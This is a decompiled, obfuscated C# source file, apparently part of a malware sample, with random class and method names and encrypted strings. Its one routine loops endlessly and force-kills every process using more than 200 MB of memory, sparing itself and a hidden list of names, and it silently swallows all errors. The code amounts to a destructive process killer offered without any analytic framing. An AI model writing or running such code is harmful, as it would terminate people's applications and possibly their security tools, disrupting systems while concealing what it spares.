using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace drXPuaQNZPOSPCS;

public static class LHjBqQfiBctg
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void XDkzGSDDXywG()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107399034)) && !process.ProcessName.Contains(getString_0(107399057)) && !process.ProcessName.Contains(getString_0(107399048)) && !process.ProcessName.Contains(getString_0(107399007)) && !process.ProcessName.Contains(getString_0(107399026)) && !process.ProcessName.Contains(getString_0(107399013)) && !process.ProcessName.Contains(getString_0(107398968)) && !process.ProcessName.Contains(getString_0(107398987)) && !process.ProcessName.Contains(getString_0(107398942)) && !process.ProcessName.Contains(getString_0(107398961)) && !process.ProcessName.Contains(getString_0(107398908)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static LHjBqQfiBctg()
	{
		Strings.CreateGetStringDelegate(typeof(LHjBqQfiBctg));
	}
}
